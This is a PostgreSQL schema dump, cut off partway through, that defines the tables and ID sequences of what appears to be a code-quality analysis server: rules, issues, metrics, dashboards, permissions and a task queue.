--
-- PostgreSQL database dump
--

-- Dumped from database version 9.6.5
-- Dumped by pg_dump version 10.0

-- Started on 2017-11-23 19:33:29 +03

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SET check_function_bodies = false;
SET client_min_messages = warning;
SET row_security = off;

--
-- TOC entry 1 (class 3079 OID 12393)
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner:
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- TOC entry 2713 (class 0 OID 0)
-- Dependencies: 1
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner:
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


SET search_path = public, pg_catalog;

SET default_tablespace = '';

SET default_with_oids = false;

--
-- TOC entry 220 (class 1259 OID 33056)
-- Name: active_dashboards; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE active_dashboards (
    id integer NOT NULL,
    dashboard_id integer NOT NULL,
    user_id integer,
    order_index integer
);


ALTER TABLE active_dashboards OWNER TO postgres;

--
-- TOC entry 219 (class 1259 OID 33054)
-- Name: active_dashboards_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE active_dashboards_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE active_dashboards_id_seq OWNER TO postgres;

--
-- TOC entry 2714 (class 0 OID 0)
-- Dependencies: 219
-- Name: active_dashboards_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE active_dashboards_id_seq OWNED BY active_dashboards.id;


--
-- TOC entry 207 (class 1259 OID 32890)
-- Name: active_rule_parameters; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE active_rule_parameters (
    id integer NOT NULL,
    active_rule_id integer NOT NULL,
    rules_parameter_id integer NOT NULL,
    value character varying(4000),
    rules_parameter_key character varying(128)
);


ALTER TABLE active_rule_parameters OWNER TO postgres;

--
-- TOC entry 206 (class 1259 OID 32888)
-- Name: active_rule_parameters_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE active_rule_parameters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE active_rule_parameters_id_seq OWNER TO postgres;

--
-- TOC entry 2715 (class 0 OID 0)
-- Dependencies: 206
-- Name: active_rule_parameters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE active_rule_parameters_id_seq OWNED BY active_rule_parameters.id;


--
-- TOC entry 205 (class 1259 OID 32882)
-- Name: active_rules; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE active_rules (
    id integer NOT NULL,
    profile_id integer NOT NULL,
    rule_id integer NOT NULL,
    failure_level integer NOT NULL,
    inheritance character varying(10),
    created_at bigint,
    updated_at bigint
);


ALTER TABLE active_rules OWNER TO postgres;

--
-- TOC entry 204 (class 1259 OID 32880)
-- Name: active_rules_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE active_rules_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE active_rules_id_seq OWNER TO postgres;

--
-- TOC entry 2716 (class 0 OID 0)
-- Dependencies: 204
-- Name: active_rules_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE active_rules_id_seq OWNED BY active_rules.id;


--
-- TOC entry 262 (class 1259 OID 33464)
-- Name: activities; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE activities (
    id integer NOT NULL,
    created_at timestamp without time zone NOT NULL,
    user_login character varying(255),
    data_field text,
    log_type character varying(50),
    log_action character varying(50),
    log_message character varying(4000),
    log_key character varying(250)
);


ALTER TABLE activities OWNER TO postgres;

--
-- TOC entry 261 (class 1259 OID 33462)
-- Name: activities_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE activities_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE activities_id_seq OWNER TO postgres;

--
-- TOC entry 2717 (class 0 OID 0)
-- Dependencies: 261
-- Name: activities_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE activities_id_seq OWNED BY activities.id;


--
-- TOC entry 237 (class 1259 OID 33237)
-- Name: authors; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE authors (
    id integer NOT NULL,
    person_id integer NOT NULL,
    login character varying(255),
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE authors OWNER TO postgres;

--
-- TOC entry 236 (class 1259 OID 33235)
-- Name: authors_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE authors_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE authors_id_seq OWNER TO postgres;

--
-- TOC entry 2718 (class 0 OID 0)
-- Dependencies: 236
-- Name: authors_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE authors_id_seq OWNED BY authors.id;


--
-- TOC entry 268 (class 1259 OID 33534)
-- Name: ce_activity; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE ce_activity (
    id integer NOT NULL,
    uuid character varying(40) NOT NULL,
    task_type character varying(15) NOT NULL,
    component_uuid character varying(40),
    status character varying(15) NOT NULL,
    is_last boolean NOT NULL,
    is_last_key character varying(55) NOT NULL,
    submitter_login character varying(255),
    submitted_at bigint NOT NULL,
    started_at bigint,
    executed_at bigint,
    created_at bigint NOT NULL,
    updated_at bigint NOT NULL,
    execution_time_ms bigint,
    snapshot_id bigint
);


ALTER TABLE ce_activity OWNER TO postgres;

--
-- TOC entry 267 (class 1259 OID 33532)
-- Name: ce_activity_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE ce_activity_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE ce_activity_id_seq OWNER TO postgres;

--
-- TOC entry 2719 (class 0 OID 0)
-- Dependencies: 267
-- Name: ce_activity_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE ce_activity_id_seq OWNED BY ce_activity.id;


--
-- TOC entry 270 (class 1259 OID 33544)
-- Name: ce_queue; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE ce_queue (
    id integer NOT NULL,
    uuid character varying(40) NOT NULL,
    task_type character varying(15) NOT NULL,
    component_uuid character varying(40),
    status character varying(15) NOT NULL,
    submitter_login character varying(255),
    started_at bigint,
    created_at bigint NOT NULL,
    updated_at bigint NOT NULL
);


ALTER TABLE ce_queue OWNER TO postgres;

--
-- TOC entry 269 (class 1259 OID 33542)
-- Name: ce_queue_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE ce_queue_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE ce_queue_id_seq OWNER TO postgres;

--
-- TOC entry 2720 (class 0 OID 0)
-- Dependencies: 269
-- Name: ce_queue_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE ce_queue_id_seq OWNED BY ce_queue.id;


--
-- TOC entry 222 (class 1259 OID 33066)
-- Name: dashboards; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE dashboards (
    id integer NOT NULL,
    user_id integer,
    name character varying(256),
    description character varying(1000),
    column_layout character varying(20),
    shared boolean,
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    is_global boolean
);


ALTER TABLE dashboards OWNER TO postgres;

--
-- TOC entry 221 (class 1259 OID 33064)
-- Name: dashboards_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE dashboards_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE dashboards_id_seq OWNER TO postgres;

--
-- TOC entry 2721 (class 0 OID 0)
-- Dependencies: 221
-- Name: dashboards_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE dashboards_id_seq OWNED BY dashboards.id;


--
-- TOC entry 231 (class 1259 OID 33160)
-- Name: duplications_index; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE duplications_index (
    project_snapshot_id integer NOT NULL,
    snapshot_id integer NOT NULL,
    hash character varying(50) NOT NULL,
    index_in_file integer NOT NULL,
    start_line integer NOT NULL,
    end_line integer NOT NULL,
    id bigint NOT NULL
);


ALTER TABLE duplications_index OWNER TO postgres;

--
-- TOC entry 242 (class 1259 OID 33306)
-- Name: duplications_index_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE duplications_index_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE duplications_index_id_seq OWNER TO postgres;

--
-- TOC entry 2722 (class 0 OID 0)
-- Dependencies: 242
-- Name: duplications_index_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE duplications_index_id_seq OWNED BY duplications_index.id;


--
-- TOC entry 209 (class 1259 OID 32913)
-- Name: events; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE events (
    id integer NOT NULL,
    name character varying(400),
    snapshot_id integer,
    category character varying(50),
    description character varying(4000),
    event_data character varying(4000),
    event_date bigint NOT NULL,
    created_at bigint NOT NULL,
    component_uuid character varying(50)
);


ALTER TABLE events OWNER TO postgres;

--
-- TOC entry 208 (class 1259 OID 32911)
-- Name: events_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE events_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE events_id_seq OWNER TO postgres;

--
-- TOC entry 2723 (class 0 OID 0)
-- Dependencies: 208
-- Name: events_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE events_id_seq OWNED BY events.id;


--
-- TOC entry 264 (class 1259 OID 33499)
-- Name: file_sources; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE file_sources (
    id integer NOT NULL,
    project_uuid character varying(50) NOT NULL,
    file_uuid character varying(50) NOT NULL,
    line_hashes text,
    data_hash character varying(50),
    created_at bigint NOT NULL,
    updated_at bigint NOT NULL,
    src_hash character varying(50),
    binary_data bytea,
    data_type character varying(20),
    revision character varying(100)
);


ALTER TABLE file_sources OWNER TO postgres;

--
-- TOC entry 263 (class 1259 OID 33497)
-- Name: file_sources_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE file_sources_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE file_sources_id_seq OWNER TO postgres;

--
-- TOC entry 2724 (class 0 OID 0)
-- Dependencies: 263
-- Name: file_sources_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE file_sources_id_seq OWNED BY file_sources.id;


--
-- TOC entry 216 (class 1259 OID 32965)
-- Name: group_roles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE group_roles (
    id integer NOT NULL,
    group_id integer,
    resource_id integer,
    role character varying(64) NOT NULL
);


ALTER TABLE group_roles OWNER TO postgres;

--
-- TOC entry 215 (class 1259 OID 32963)
-- Name: group_roles_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE group_roles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE group_roles_id_seq OWNER TO postgres;

--
-- TOC entry 2725 (class 0 OID 0)
-- Dependencies: 215
-- Name: group_roles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE group_roles_id_seq OWNED BY group_roles.id;


--
-- TOC entry 213 (class 1259 OID 32952)
-- Name: groups; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE groups (
    id integer NOT NULL,
    name character varying(500),
    description character varying(200),
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE groups OWNER TO postgres;

--
-- TOC entry 212 (class 1259 OID 32950)
-- Name: groups_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE groups_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE groups_id_seq OWNER TO postgres;

--
-- TOC entry 2726 (class 0 OID 0)
-- Dependencies: 212
-- Name: groups_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE groups_id_seq OWNED BY groups.id;


--
-- TOC entry 214 (class 1259 OID 32958)
-- Name: groups_users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE groups_users (
    user_id integer,
    group_id integer
);


ALTER TABLE groups_users OWNER TO postgres;

--
-- TOC entry 246 (class 1259 OID 33331)
-- Name: issue_changes; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE issue_changes (
    id bigint NOT NULL,
    kee character varying(50),
    issue_key character varying(50) NOT NULL,
    user_login character varying(255),
    change_type character varying(20),
    change_data text,
    created_at bigint,
    updated_at bigint,
    issue_change_creation_date bigint
);


ALTER TABLE issue_changes OWNER TO postgres;

--
-- TOC entry 245 (class 1259 OID 33329)
-- Name: issue_changes_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE issue_changes_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issue_changes_id_seq OWNER TO postgres;

--
-- TOC entry 2727 (class 0 OID 0)
-- Dependencies: 245
-- Name: issue_changes_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE issue_changes_id_seq OWNED BY issue_changes.id;


--
-- TOC entry 250 (class 1259 OID 33369)
-- Name: issue_filter_favourites; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE issue_filter_favourites (
    id integer NOT NULL,
    user_login character varying(255) NOT NULL,
    issue_filter_id integer NOT NULL,
    created_at timestamp without time zone
);


ALTER TABLE issue_filter_favourites OWNER TO postgres;

--
-- TOC entry 249 (class 1259 OID 33367)
-- Name: issue_filter_favourites_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE issue_filter_favourites_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issue_filter_favourites_id_seq OWNER TO postgres;

--
-- TOC entry 2728 (class 0 OID 0)
-- Dependencies: 249
-- Name: issue_filter_favourites_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE issue_filter_favourites_id_seq OWNED BY issue_filter_favourites.id;


--
-- TOC entry 248 (class 1259 OID 33356)
-- Name: issue_filters; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE issue_filters (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    user_login character varying(255),
    shared boolean DEFAULT false NOT NULL,
    description character varying(4000),
    data text,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE issue_filters OWNER TO postgres;

--
-- TOC entry 247 (class 1259 OID 33354)
-- Name: issue_filters_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE issue_filters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issue_filters_id_seq OWNER TO postgres;

--
-- TOC entry 2729 (class 0 OID 0)
-- Dependencies: 247
-- Name: issue_filters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE issue_filters_id_seq OWNED BY issue_filters.id;


--
-- TOC entry 244 (class 1259 OID 33320)
-- Name: issues; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE issues (
    id bigint NOT NULL,
    kee character varying(50) NOT NULL,
    rule_id integer,
    severity character varying(10),
    manual_severity boolean NOT NULL,
    message character varying(4000),
    line integer,
    gap numeric(30,20),
    status character varying(20),
    resolution character varying(20),
    checksum character varying(1000),
    reporter character varying(255),
    assignee character varying(255),
    author_login character varying(255),
    action_plan_key character varying(50),
    issue_attributes character varying(4000),
    effort integer,
    created_at bigint,
    updated_at bigint,
    issue_creation_date bigint,
    issue_update_date bigint,
    issue_close_date bigint,
    tags character varying(4000),
    component_uuid character varying(50),
    project_uuid character varying(50),
    locations bytea,
    issue_type smallint
);


ALTER TABLE issues OWNER TO postgres;

--
-- TOC entry 243 (class 1259 OID 33318)
-- Name: issues_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE issues_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE issues_id_seq OWNER TO postgres;

--
-- TOC entry 2730 (class 0 OID 0)
-- Dependencies: 243
-- Name: issues_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE issues_id_seq OWNED BY issues.id;


--
-- TOC entry 233 (class 1259 OID 33172)
-- Name: loaded_templates; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE loaded_templates (
    id integer NOT NULL,
    kee character varying(200),
    template_type character varying(15)
);


ALTER TABLE loaded_templates OWNER TO postgres;

--
-- TOC entry 232 (class 1259 OID 33170)
-- Name: loaded_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE loaded_templates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE loaded_templates_id_seq OWNER TO postgres;

--
-- TOC entry 2731 (class 0 OID 0)
-- Dependencies: 232
-- Name: loaded_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE loaded_templates_id_seq OWNED BY loaded_templates.id;


--
-- TOC entry 228 (class 1259 OID 33127)
-- Name: manual_measures; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE manual_measures (
    id bigint NOT NULL,
    metric_id integer NOT NULL,
    value numeric(38,20),
    text_value character varying(4000),
    user_login character varying(255),
    description character varying(4000),
    created_at bigint,
    updated_at bigint,
    component_uuid character varying(50)
);


ALTER TABLE manual_measures OWNER TO postgres;

--
-- TOC entry 227 (class 1259 OID 33125)
-- Name: manual_measures_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE manual_measures_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE manual_measures_id_seq OWNER TO postgres;

--
-- TOC entry 2732 (class 0 OID 0)
-- Dependencies: 227
-- Name: manual_measures_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE manual_measures_id_seq OWNED BY manual_measures.id;


--
-- TOC entry 241 (class 1259 OID 33275)
-- Name: measure_filter_favourites; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE measure_filter_favourites (
    id integer NOT NULL,
    user_id integer NOT NULL,
    measure_filter_id integer NOT NULL,
    created_at timestamp without time zone
);


ALTER TABLE measure_filter_favourites OWNER TO postgres;

--
-- TOC entry 240 (class 1259 OID 33273)
-- Name: measure_filter_favourites_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE measure_filter_favourites_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE measure_filter_favourites_id_seq OWNER TO postgres;

--
-- TOC entry 2733 (class 0 OID 0)
-- Dependencies: 240
-- Name: measure_filter_favourites_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE measure_filter_favourites_id_seq OWNED BY measure_filter_favourites.id;


--
-- TOC entry 239 (class 1259 OID 33262)
-- Name: measure_filters; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE measure_filters (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    user_id integer,
    shared boolean DEFAULT false NOT NULL,
    description character varying(4000),
    data text,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE measure_filters OWNER TO postgres;

--
-- TOC entry 238 (class 1259 OID 33260)
-- Name: measure_filters_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE measure_filters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE measure_filters_id_seq OWNER TO postgres;

--
-- TOC entry 2734 (class 0 OID 0)
-- Dependencies: 238
-- Name: measure_filters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE measure_filters_id_seq OWNED BY measure_filters.id;


--
-- TOC entry 191 (class 1259 OID 32796)
-- Name: metrics; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE metrics (
    id integer NOT NULL,
    name character varying(64) NOT NULL,
    description character varying(255),
    direction integer DEFAULT 0 NOT NULL,
    domain character varying(64),
    short_name character varying(64),
    qualitative boolean DEFAULT false NOT NULL,
    val_type character varying(8),
    user_managed boolean DEFAULT false,
    enabled boolean DEFAULT true,
    worst_value numeric(38,20),
    best_value numeric(38,20),
    optimized_best_value boolean,
    hidden boolean,
    delete_historical_data boolean,
    decimal_scale integer
);


ALTER TABLE metrics OWNER TO postgres;

--
-- TOC entry 190 (class 1259 OID 32794)
-- Name: metrics_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE metrics_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE metrics_id_seq OWNER TO postgres;

--
-- TOC entry 2735 (class 0 OID 0)
-- Dependencies: 190
-- Name: metrics_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE metrics_id_seq OWNED BY metrics.id;


--
-- TOC entry 230 (class 1259 OID 33149)
-- Name: notifications; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE notifications (
    id integer NOT NULL,
    data bytea
);


ALTER TABLE notifications OWNER TO postgres;

--
-- TOC entry 229 (class 1259 OID 33147)
-- Name: notifications_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE notifications_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE notifications_id_seq OWNER TO postgres;

--
-- TOC entry 2736 (class 0 OID 0)
-- Dependencies: 229
-- Name: notifications_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE notifications_id_seq OWNED BY notifications.id;


--
-- TOC entry 256 (class 1259 OID 33397)
-- Name: perm_templates_groups; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE perm_templates_groups (
    id integer NOT NULL,
    group_id integer,
    template_id integer NOT NULL,
    permission_reference character varying(64) NOT NULL,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE perm_templates_groups OWNER TO postgres;

--
-- TOC entry 255 (class 1259 OID 33395)
-- Name: perm_templates_groups_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE perm_templates_groups_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE perm_templates_groups_id_seq OWNER TO postgres;

--
-- TOC entry 2737 (class 0 OID 0)
-- Dependencies: 255
-- Name: perm_templates_groups_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE perm_templates_groups_id_seq OWNED BY perm_templates_groups.id;


--
-- TOC entry 254 (class 1259 OID 33389)
-- Name: perm_templates_users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE perm_templates_users (
    id integer NOT NULL,
    user_id integer NOT NULL,
    template_id integer NOT NULL,
    permission_reference character varying(64) NOT NULL,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE perm_templates_users OWNER TO postgres;

--
-- TOC entry 253 (class 1259 OID 33387)
-- Name: perm_templates_users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE perm_templates_users_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE perm_templates_users_id_seq OWNER TO postgres;

--
-- TOC entry 2738 (class 0 OID 0)
-- Dependencies: 253
-- Name: perm_templates_users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE perm_templates_users_id_seq OWNED BY perm_templates_users.id;


--
-- TOC entry 252 (class 1259 OID 33378)
-- Name: permission_templates; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE permission_templates (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    kee character varying(100) NOT NULL,
    description character varying(4000),
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    key_pattern character varying(500)
);


ALTER TABLE permission_templates OWNER TO postgres;

--
-- TOC entry 251 (class 1259 OID 33376)
-- Name: permission_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE permission_templates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE permission_templates_id_seq OWNER TO postgres;

--
-- TOC entry 2739 (class 0 OID 0)
-- Dependencies: 251
-- Name: permission_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE permission_templates_id_seq OWNED BY permission_templates.id;


--
-- TOC entry 199 (class 1259 OID 32841)
-- Name: project_links; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE project_links (
    id integer NOT NULL,
    link_type character varying(20),
    name character varying(128),
    href character varying(2048) NOT NULL,
    component_uuid character varying(50)
);


ALTER TABLE project_links OWNER TO postgres;

--
-- TOC entry 198 (class 1259 OID 32839)
-- Name: project_links_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE project_links_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE project_links_id_seq OWNER TO postgres;

--
-- TOC entry 2740 (class 0 OID 0)
-- Dependencies: 198
-- Name: project_links_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE project_links_id_seq OWNED BY project_links.id;


--
-- TOC entry 193 (class 1259 OID 32808)
-- Name: project_measures; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE project_measures (
    id bigint NOT NULL,
    value numeric(38,20),
    metric_id integer NOT NULL,
    snapshot_id integer,
    rule_id integer,
    rules_category_id integer,
    text_value character varying(4000),
    tendency integer,
    measure_date timestamp without time zone,
    project_id integer,
    alert_status character varying(5),
    alert_text character varying(4000),
    url character varying(2000),
    description character varying(4000),
    rule_priority integer,
    characteristic_id integer,
    person_id integer,
    variation_value_1 numeric(38,20),
    variation_value_2 numeric(38,20),
    variation_value_3 numeric(38,20),
    variation_value_4 numeric(38,20),
    variation_value_5 numeric(38,20),
    measure_data bytea
);


ALTER TABLE project_measures OWNER TO postgres;

--
-- TOC entry 192 (class 1259 OID 32806)
-- Name: project_measures_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE project_measures_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE project_measures_id_seq OWNER TO postgres;

--
-- TOC entry 2741 (class 0 OID 0)
-- Dependencies: 192
-- Name: project_measures_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE project_measures_id_seq OWNED BY project_measures.id;


--
-- TOC entry 266 (class 1259 OID 33520)
-- Name: project_qprofiles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE project_qprofiles (
    id integer NOT NULL,
    project_uuid character varying(50) NOT NULL,
    profile_key character varying(255) NOT NULL
);


ALTER TABLE project_qprofiles OWNER TO postgres;

--
-- TOC entry 265 (class 1259 OID 33518)
-- Name: project_qprofiles_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE project_qprofiles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE project_qprofiles_id_seq OWNER TO postgres;

--
-- TOC entry 2742 (class 0 OID 0)
-- Dependencies: 265
-- Name: project_qprofiles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE project_qprofiles_id_seq OWNED BY project_qprofiles.id;


--
-- TOC entry 187 (class 1259 OID 32774)
-- Name: projects; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE projects (
    id integer NOT NULL,
    name character varying(2000),
    description character varying(2000),
    enabled boolean DEFAULT true NOT NULL,
    scope character varying(3),
    qualifier character varying(10),
    kee character varying(400),
    root_id integer,
